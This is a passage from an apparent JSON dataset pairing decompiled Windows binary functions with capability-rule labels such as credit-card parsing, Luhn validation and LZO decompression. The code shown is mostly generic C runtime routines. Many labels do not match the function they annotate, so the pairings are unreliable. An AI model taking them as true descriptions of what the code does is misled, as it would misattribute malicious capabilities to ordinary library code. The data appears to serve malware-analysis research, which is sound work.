4 + 0x405fdc)) {\n        case 0x405fe4:\n            goto code_r0x00405fe4;\n        case 0x405ff0:\n            goto code_r0x00405ff0;\n        case 0x406004:\n            goto code_r0x00406004;\n        }\n    }\n    else {\n        uVar3 = (arg_10h - 4) + (arg_8h & 3);\n        switch(*((arg_8h & 3) * 4 + 0x405ee0)) {\n        case 0x405ef0:\n            *arg_8h = *arg_ch;\n            *(arg_8h + 1) = *(arg_ch + 1);\n            uVar2 = uVar3 >> 2;\n            *(arg_8h + 2) = *(arg_ch + 2);\n            arg_ch = arg_ch + 3;\n            puVar1 = arg_8h + 3;\n            if (uVar2 < 8) {\ncode_r0x00405edc:\n    // WARNING: Could not recover jumptable at 0x00405edc. Too many branches\n    // WARNING: Treating indirect jump as call\n    // switch table (8 cases) at 0x405f60\n                puVar1 = (**(uVar2 * 4 + 0x405f60))();\n                return puVar1;\n            }\n            for (; uVar2 != 0; uVar2 = uVar2 - 1) {\n                *puVar1 = *arg_ch;\n                arg_ch = arg_ch + 1;\n                puVar1 = puVar1 + 1;\n            }\n            switch(*((uVar3 & 3) * 4 + 0x405fcc)) {\n            case 0x405fe4:\n                goto code_r0x00405fe4;\n            case 0x405ff0:\n                goto code_r0x00405ff0;\n            case 0x406004:\n                goto code_r0x00406004;\n            }\n            break;\n        case 0x405f1c:\n            *arg_8h = *arg_ch;\n            uVar2 = uVar3 >> 2;\n            *(arg_8h + 1) = *(arg_ch + 1);\n            arg_ch = arg_ch + 2;\n            puVar1 = arg_8h + 2;\n            if (uVar2 < 8) goto code_r0x00405edc;\n            for (; uVar2 != 0; uVar2 = uVar2 - 1) {\n                *puVar1 = *arg_ch;\n                arg_ch = arg_ch + 1;\n                puVar1 = puVar1 + 1;\n            }\n            switch(*((uVar3 & 3) * 4 + 0x405fcc)) {\n            case 0x405fe4:\n                goto code_r0x00405fe4;\n            case 0x405ff0:\n                goto code_r0x00405ff0;\n            case 0x406004:\n                goto code_r0x00406004;\n            }\n            break;\n        case 0x405f40:\n            *arg_8h = *arg_ch;\n            uVar2 = uVar3 >> 2;\n            arg_ch = arg_ch + 1;\n            puVar1 = arg_8h + 1;\n            if (uVar2 < 8) goto code_r0x00405edc;\n            for (; uVar2 != 0; uVar2 = uVar2 - 1) {\n                *puVar1 = *arg_ch;\n                arg_ch = arg_ch + 1;\n                puVar1 = puVar1 + 1;\n            }\n            switch(*((uVar3 & 3) * 4 + 0x405fcc)) {\n            case 0x405fe4:\n                goto code_r0x00405fe4;\n            case 0x405ff0:\n                goto code_r0x00405ff0;\n            case 0x406004:\n                goto code_r0x00406004;\n            }\n        }\n    }\n    return arg_8h;\n}\n",
        "token_count": 2647
    },
    "004061c0": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\nuint32_t * fcn.004061c0(uint32_t *param_1, uint8_t param_2, uint32_t param_3)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint32_t *puVar4;\n    \n    if (param_3 == 0) {\n        return param_1;\n    }\n    uVar1 = param_2;\n    puVar4 = param_1;\n    if (3 < param_3) {\n        uVar2 = -param_1 & 3;\n        uVar3 = param_3;\n        if (uVar2 != 0) {\n            uVar3 = param_3 - uVar2;\n            do {\n                *puVar4 = param_2;\n                puVar4 = puVar4 + 1;\n                uVar2 = uVar2 - 1;\n            } while (uVar2 != 0);\n        }\n        uVar1 = uVar1 * 0x1010101;\n        param_3 = uVar3 & 3;\n        uVar3 = uVar3 >> 2;\n        if (uVar3 != 0) {\n            for (; uVar3 != 0; uVar3 = uVar3 - 1) {\n                *puVar4 = uVar1;\n                puVar4 = puVar4 + 1;\n            }\n            if (param_3 == 0) {\n                return param_1;\n            }\n        }\n    }\n    do {\n        *puVar4 = uVar1;\n        puVar4 = puVar4 + 1;\n        param_3 = param_3 - 1;\n    } while (param_3 != 0);\n    return param_1;\n}\n",
        "token_count": 387
    },
    "0040574b": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Variable defined which should be unmapped: var_1ch\n// WARNING: Variable defined which should be unmapped: var_18h_2\n\nvoid __cdecl fcn.0040574b(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint arg_8h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t unaff_EBP;\n    char *pcVar4;\n    uint var_8h;\n    uint var_ch;\n    uint var_128h_2;\n    uint var_124h_2;\n    uint var_128h;\n    uint lpFilename;\n    uint var_18h_2;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint uStack4;\n    \n    uStack4 = 0x118;\n    var_18h = 0x4077b0;\n    fcn.00403650();\n    *(unaff_EBP + -0x1c) = *0x425b90;\n    pcVar1 = *0x45e21c;\n    if (*0x45e21c == NULL) {\n        if (*(unaff_EBP + 8) == 1) {\n            pcVar4 = \"Buffer overrun detected!\";\n            *(unaff_EBP + -0x128) =\n                 \"A buffer overrun has been detected which has corrupted the program\\'s\\ninternal state.  The program cannot safely continue execution and must\\nnow be terminated.\\n\"\n            ;\n        }\n        else {\n            pcVar4 = \"Unknown security failure detected!\";\n            *(unaff_EBP + -0x128) =\n                 \"A security error of unknown cause has been detected which has\\ncorrupted the program\\'s internal state.  The program cannot safely\\ncontinue execution and must now be terminated.\\n\"\n            ;\n        }\n        *(unaff_EBP + -0x20) = 0;\n        iVar2 = (*_sym.imp.KERNEL32.dll_GetModuleFileNameA)(0, unaff_EBP + -0x124, 0x104);\n        if (iVar2 == 0) {\n            fcn.004039b0(unaff_EBP + -0x124, \"<program name unknown>\");\n        }\n        iVar2 = unaff_EBP + -0x124;\n        iVar3 = fcn.00403be0(iVar2);\n        if (0x3c < iVar3 + 0xbU) {\n            iVar2 = fcn.00403be0(iVar2);\n            iVar2 = iVar2 + unaff_EBP + -0x155;\n            fcn.00403ab0(iVar2, 0x407550, 3);\n        }\n        fcn.00403be0(iVar2);\n        fcn.004037b0();\n        *(unaff_EBP + -0x18) = &var_18h;\n        fcn.004039b0(&var_18h, pcVar4);\n        fcn.004039c0(&var_18h, 0x407530);\n        fcn.004039c0(&var_18h, \"Program: \");\n        fcn.004039c0(&var_18h, iVar2);\n        fcn.004039c0(&var_18h, 0x407530);\n        fcn.004039c0(&var_18h, *(unaff_EBP + -0x128));\n        fcn.004038a9(&var_18h, \"Microsoft Visual C++ Runtime Library\", 0x12010);\n    }\n    else {\n        *(unaff_EBP + -4) = 0;\n        (*pcVar1)(*(unaff_EBP + 8), *(unaff_EBP + 0xc));\n        *(unaff_EBP + -4) = 0xffffffff;\n    }\n    fcn.00402aea(3);\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 905
    },
    "00402f13": {
        "rules": [
            "parse credit card information/92c3fd9898ba41b4bad3ffb6188f4688",
            "search for credit card data/212a26c2b8d740cd9f6579dba482d653"
        ],
        "decompiled_code": "\nuint fcn.00402f13(void)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    char *pcVar3;\n    int32_t iVar4;\n    \n    if (*0x45e5cc == 0) {\n        fcn.004041da();\n    }\n    iVar4 = 0;\n    pcVar3 = *0x45e040;\n    if (*0x45e040 != NULL) {\n        for (; *pcVar3 != '\\0'; pcVar3 = pcVar3 + iVar2 + 1) {\n            if (*pcVar3 != '=') {\n                iVar4 = iVar4 + 1;\n            }\n            iVar2 = fcn.00403be0(pcVar3);\n        }\n        piVar1 = fcn.004042a2(iVar4 * 4 + 4);\n        pcVar3 = *0x45e040;\n        *0x45e078 = piVar1;\n        if (piVar1 != NULL) {\n            do {\n                if (*pcVar3 == '\\0') {\n                    fcn.004041f8(*0x45e040);\n                    *0x45e040 = NULL;\n                    *piVar1 = 0;\n                    *0x45e5c0 = 1;\n                    return 0;\n                }\n                iVar4 = fcn.00403be0(pcVar3);\n                if (*pcVar3 != '=') {\n                    iVar2 = fcn.004042a2(iVar4 + 1);\n                    *piVar1 = iVar2;\n                    if (iVar2 == 0) {\n                        fcn.004041f8(*0x45e078);\n                        *0x45e078 = NULL;\n                        return 0xffffffff;\n                    }\n                    fcn.004039b0(iVar2, pcVar3);\n                    piVar1 = piVar1 + 1;\n                }\n                pcVar3 = pcVar3 + iVar4 + 1;\n            } while( true );\n        }\n    }\n    return 0xffffffff;\n}\n",
        "token_count": 444
    },
    "004036a4": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint fcn.004036a4(int32_t param_1, int32_t param_2, uint param_3)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t extraout_ECX;\n    uchar *puVar4;\n    int32_t iVar5;\n    int32_t iStack12;\n    uint uStack8;\n    \n    puVar4 = &stack0xfffffffc;\n    if ((*(param_1 + 4) & 6) == 0) {\n        iStack12 = param_1;\n        uStack8 = param_3;\n        *(param_2 + -4) = &iStack12;\n        iVar5 = *(param_2 + 0xc);\n        iVar3 = *(param_2 + 8);\n        iVar2 = fcn.00405322(param_2);\n        if (iVar2 == 0) {\n            *(param_1 + 4) = *(param_1 + 4) | 8;\n        }\n        else {\n            for (; iVar5 != -1; iVar5 = *(iVar3 + iVar5 * 0xc)) {\n                pcVar1 = *(iVar3 + 4 + iVar5 * 0xc);\n                if (pcVar1 != NULL) {\n                    iVar3 = (*pcVar1)();\n                    param_2 = *(puVar4 + 0xc);\n                    if (iVar3 != 0) {\n                        if (iVar3 < 0) {\n                            return 0;\n                        }\n                        iVar3 = *(param_2 + 8);\n                        fcn.00405234(param_2);\n                        puVar4 = param_2 + 0x10;\n                        fcn.00405276(param_2, iVar5);\n                        fcn.0040530a(1);\n                        *(param_2 + 0xc) = *(iVar3 + extraout_ECX * 4);\n                        param_2 = 0;\n                        iVar5 = 0;\n                        (**(iVar3 + 8 + extraout_ECX * 4))();\n                    }\n                }\n                iVar3 = *(param_2 + 8);\n            }\n        }\n    }\n    else {\n        fcn.00405276(param_2, 0xffffffff, &stack0xfffffffc, &stack0xfffffffc);\n    }\n    return 1;\n}\n",
        "token_count": 509
    },
    "0040658a": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint32_t fcn.0040658a(uint8_t *param_1)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint8_t *puVar5;\n    \n    while( true ) {\n        iVar1 = fcn.00406660(*param_1);\n        if (iVar1 == 0) break;\n        param_1 = param_1 + 1;\n    }\n    uVar2 = *param_1;\n    puVar5 = param_1 + 1;\n    if ((uVar2 == 0x2d) || (uVar3 = uVar2,  uVar2 == 0x2b)) {\n        uVar3 = *puVar5;\n        puVar5 = param_1 + 2;\n    }\n    iVar1 = 0;\n    while( true ) {\n        if ((uVar3 < 0x30) || (0x39 < uVar3)) {\n            iVar4 = -1;\n        }\n        else {\n            iVar4 = uVar3 - 0x30;\n        }\n        if (iVar4 == -1) break;\n        iVar1 = iVar4 + iVar1 * 10;\n        uVar3 = *puVar5;\n        puVar5 = puVar5 + 1;\n    }\n    if (uVar2 == 0x2d) {\n        iVar1 = -iVar1;\n    }\n    return iVar1;\n}\n",
        "token_count": 328
    },
    "004029ae": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.004029ae(uint param_1)\n\n{\n    int32_t iVar1;\n    code **ppcVar2;\n    \n    if (*0x45e5d0 != NULL) {\n        (**0x45e5d0)(param_1);\n    }\n    iVar1 = 0;\n    ppcVar2 = 0x40900c;\n    do {\n        if (iVar1 != 0) {\n            return iVar1;\n        }\n        if (*ppcVar2 != NULL) {\n            iVar1 = (**ppcVar2)();\n        }\n        ppcVar2 = ppcVar2 + 1;\n    } while (ppcVar2 < 0x409018);\n    if (iVar1 == 0) {\n        fcn.0040386f(0x40351c);\n        ppcVar2 = 0x409000;\n        do {\n            if (*ppcVar2 != NULL) {\n                (**ppcVar2)();\n            }\n            ppcVar2 = ppcVar2 + 1;\n        } while (ppcVar2 < 0x409008);\n        iVar1 = 0;\n    }\n    return iVar1;\n}\n",
        "token_count": 258
    },
    "004034d8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid fcn.004034d8(void)\n\n{\n    int32_t unaff_EBP;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.00403650(0x407570, 0xc);\n    *(unaff_EBP + -0x1c) = 0x407d6c;\n    while (*(unaff_EBP + -0x1c) < 0x407d6c) {\n        *(unaff_EBP + -4) = 0;\n        if (**(unaff_EBP + -0x1c) != NULL) {\n            (***(unaff_EBP + -0x1c))();\n        }\n        *(unaff_EBP + -4) = 0xffffffff;\n        *(unaff_EBP + -0x1c) = *(unaff_EBP + -0x1c) + 4;\n    }\n    fcn.0040368b();\n    return;\n}\n",
        "token_count": 225
    },
    "004037b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n\nvoid fcn.004037b0(void)\n\n{\n    uint32_t in_EAX;\n    uchar *puVar1;\n    uint unaff_retaddr;\n    \n    if (in_EAX < 0x1000) {\n        *(&stack0x00000000 + -in_EAX) = unaff_retaddr;\n        return;\n    }\n    puVar1 = &stack0x00000004;\n    do {\n        puVar1 = puVar1 + -0x1000;\n        in_EAX = in_EAX - 0x1000;\n    } while (0xfff < in_EAX);\n    *(puVar1 + (-4 - in_EAX)) = unaff_retaddr;\n    return;\n}\n",
        "token_count": 167
    },
    "004037ed": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid fcn.004037ed(uint param_1)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    \n    uVar1 = fcn.004056ad(*0x45e5c8);\n    if (uVar1 < *0x45e5c4 + (4 - *0x45e5c8)) {\n        uVar3 = 0x800;\n        if (uVar1 < 0x800) {\n            uVar3 = uVar1;\n        }\n        iVar2 = fcn.0040554b(*0x45e5c8, uVar3 + uVar1);\n        if (iVar2 == 0) {\n            iVar2 = fcn.0040554b(*0x45e5c8, uVar1 + 0x10);\n            if (iVar2 == 0) {\n                return;\n            }\n        }\n        *0x45e5c4 = iVar2 + (*0x45e5c4 - *0x45e5c8 >> 2) * 4;\n        *0x45e5c8 = iVar2;\n    }\n    **0x45e5c4 = param_1;\n    *0x45e5c4 = *0x45e5c4 + 1;\n    return;\n}\n",
        "token_count": 298
    },
    "004039c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t * fcn.004039c0(uint32_t *param_1, uint32_t *param_2)\n\n{\n    uint8_t uVar1;\n    uint32_t uVar2;\n    uint32_t *puVar3;\n    uint32_t uVar4;\n    uint32_t *puVar5;\n    \n    uVar4 = param_1 & 3;\n    puVar3 = param_1;\n    while (uVar4 != 0) {\n        uVar1 = *puVar3;\n        puVar3 = puVar3 + 1;\n        if (uVar1 == 0) goto code_r0x00403a13;\n        uVar4 = puVar3 & 3;\n    }\n    do {\n        do {\n            puVar5 = puVar3;\n            puVar3 = puVar5 + 1;\n        } while (((*puVar5 ^ 0xffffffff ^ *puVar5 + 0x7efefeff) & 0x81010100) == 0);\n        uVar4 = *puVar5;\n        if (uVar4 == '\\0') goto code_r0x00403a25;\n        if (uVar4 >> 8 == '\\0') {\n            puVar5 = puVar5 + 1;\n            goto code_r0x00403a25;\n        }\n        if ((uVar4 & 0xff0000) == 0) {\n            puVar5 = puVar5 + 2;\n            goto code_r0x00403a25;\n        }\n    } while ((uVar4 & 0xff000000) != 0);\ncode_r0x00403a13:\n    puVar5 = puVar3 + -1;\ncode_r0x00403a25:\n    uVar4 = param_2 & 3;\n    while (uVar4 != 0) {\n        uVar1 = *param_2;\n        uVar4 = uVar1;\n        param_2 = param_2 + 1;\n        if (uVar1 == 0) goto code_r0x00403aa0;\n        *puVar5 = uVar1;\n        puVar5 = puVar5 + 1;\n        uVar4 = param_2 & 3;\n    }\n    do {\n        uVar2 = *param_2;\n        uVar4 = *param_2;\n        param_2 = param_2 + 1;\n        if (((uVar2 ^ 0xffffffff ^ uVar2 + 0x7efefeff) & 0x81010100) != 0) {\n            if (uVar4 == '\\0') {\ncode_r0x00403aa0:\n                *puVar5 = uVar4;\n                return param_1;\n            }\n            if (uVar4 >> 8 == '\\0') {\n                *puVar5 = uVar4;\n                return param_1;\n            }\n            if ((uVar4 & 0xff0000) == 0) {\n                *puVar5 = uVar4;\n                *(puVar5 + 2) = 0;\n                return param_1;\n            }\n            if ((uVar4 & 0xff000000) == 0) {\n                *puVar5 = uVar4;\n                return param_1;\n            }\n        }\n        *puVar5 = uVar4;\n        puVar5 = puVar5 + 1;\n    } while( true );\n}\n",
        "token_count": 752
    },
    "004039b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t * fcn.004039b0(uint32_t *param_1, uint32_t *param_2)\n\n{\n    uint8_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint32_t *puVar4;\n    \n    uVar3 = param_2 & 3;\n    puVar4 = param_1;\n    while (uVar3 != 0) {\n        uVar1 = *param_2;\n        uVar3 = uVar1;\n        param_2 = param_2 + 1;\n        if (uVar1 == 0) goto code_r0x00403aa0;\n        *puVar4 = uVar1;\n        puVar4 = puVar4 + 1;\n        uVar3 = param_2 & 3;\n    }\n    do {\n        uVar2 = *param_2;\n        uVar3 = *param_2;\n        param_2 = param_2 + 1;\n        if (((uVar2 ^ 0xffffffff ^ uVar2 + 0x7efefeff) & 0x81010100) != 0) {\n            if (uVar3 == '\\0') {\ncode_r0x00403aa0:\n                *puVar4 = uVar3;\n                return param_1;\n            }\n            if (uVar3 >> 8 == '\\0') {\n                *puVar4 = uVar3;\n                return param_1;\n            }\n            if ((uVar3 & 0xff0000) == 0) {\n                *puVar4 = uVar3;\n                *(puVar4 + 2) = 0;\n                return param_1;\n            }\n            if ((uVar3 & 0xff000000) == 0) {\n                *puVar4 = uVar3;\n                return param_1;\n            }\n        }\n        *puVar4 = uVar3;\n        puVar4 = puVar4 + 1;\n    } while( true );\n}\n",
        "token_count": 439
    },
    "00404311": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t fcn.00404311(int32_t param_1)\n\n{\n    uint32_t uVar1;\n    \n    uVar1 = *0x45e25c;\n    while( true ) {\n        if (*0x45e25c + *0x45e258 * 0x14 <= uVar1) {\n            return 0;\n        }\n        if (param_1 - *(uVar1 + 0xc) < 0x100000) break;\n        uVar1 = uVar1 + 0x14;\n    }\n    return uVar1;\n}\n",
        "token_count": 128
    },
    "00404654": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint * fcn.00404654(void)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    \n    if (*0x45e258 == *0x45e268) {\n        iVar2 = (*_sym.imp.KERNEL32.dll_HeapReAlloc)(*0x45e4a0, 0, *0x45e25c, (*0x45e268 * 5 + 0x50) * 4);\n        if (iVar2 == 0) {\n            return NULL;\n        }\n        *0x45e268 = *0x45e268 + 0x10;\n        *0x45e25c = iVar2;\n    }\n    puVar1 = *0x45e25c + *0x45e258 * 0x14;\n    iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(*0x45e4a0, 8, 0x41c4);\n    puVar1[4] = iVar2;\n    if (iVar2 != 0) {\n        iVar2 = (*_sym.imp.KERNEL32.dll_VirtualAlloc)(0, 0x100000, 0x2000, 4);\n        puVar1[3] = iVar2;\n        if (iVar2 != 0) {\n            puVar1[2] = 0xffffffff;\n            *puVar1 = 0;\n            puVar1[1] = 0;\n            *0x45e258 = *0x45e258 + 1;\n            *puVar1[4] = 0xffffffff;\n            return puVar1;\n        }\n        (*_sym.imp.KERNEL32.dll_HeapFree)(*0x45e4a0, 0, puVar1[4]);\n    }\n    return NULL;\n}\n",
        "token_count": 391
    },
    "00406737": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nuint32_t __cdecl fcn.00406737(uint32_t arg_8h, uint32_t arg_ch)\n\n{\n    uint noname_2;\n    int32_t iVar1;\n    uint32_t in_ECX;\n    uint unaff_EBP;\n    uint unaff_retaddr;\n    uint in_stack_0000000c;\n    uint in_stack_00000010;\n    uint in_stack_00000014;\n    uint32_t var_4h;\n    \n    if (arg_8h + 1 < 0x101) {\n        arg_8h._2_2_ = *(*0x425ca0 + arg_8h * 2);\n    }\n    else {\n        if ((*(*0x425ca0 + 1 + (arg_8h >> 8 & 0xffU) * 2) & 0x80) == 0) {\n            var_4h = in_ECX & 0xffff0000 | arg_8h & 0xff;\n            noname_2 = 1;\n        }\n        else {\n            var_4h = CONCAT11(arg_8h, arg_8h >> 8);\n            var_4h = in_ECX & 0xff000000 | var_4h;\n            noname_2 = 2;\n        }\n        iVar1 = fcn.00405c93(1, &var_4h, noname_2, &arg_8h + 2, *0x45e238, *0x45e228, 1, var_4h, unaff_EBP, \n                             unaff_retaddr, arg_8h, arg_ch, in_stack_0000000c, in_stack_00000010, in_stack_00000014);\n        if (iVar1 == 0) {\n            return 0;\n        }\n    }\n    return arg_8h._2_2_ & arg_ch;\n}\n",
        "token_count": 432
    },
    "00402948": {
        "rules": [
            "link function at runtime on Windows",
            "terminate process"
        ],
        "decompiled_code": "\nvoid fcn.00402948(void)\n\n{\n    int32_t iVar1;\n    code *pcVar2;\n    uint unaff_retaddr;\n    \n    iVar1 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(\"mscoree.dll\");\n    if (iVar1 != 0) {\n        pcVar2 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar1, \"CorExitProcess\");\n        if (pcVar2 != NULL) {\n            (*pcVar2)(unaff_retaddr);\n        }\n    }\n    (*_sym.imp.KERNEL32.dll_ExitProcess)(unaff_retaddr);\n    pcVar2 = swi(3);\n    (*pcVar2)();\n    return;\n}\n",
        "token_count": 152
    },
    "00406220": {
        "rules": [
            "get geographical location"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00406220(uint Locale)\n\n{\n    int32_t iVar1;\n    uint lpLCData;\n    uchar var_6h;\n    uint var_4h;\n    \n    var_4h = *0x425b90;\n    var_6h = 0;\n    iVar1 = (*_sym.imp.KERNEL32.dll_GetLocaleInfoA)(Locale, 0x1004, &lpLCData, 6);\n    if (iVar1 != 0) {\n        fcn.0040658a(&lpLCData);\n    }\n    fcn.00403c9c();\n    return;\n}\n",
        "token_count": 136
    }
}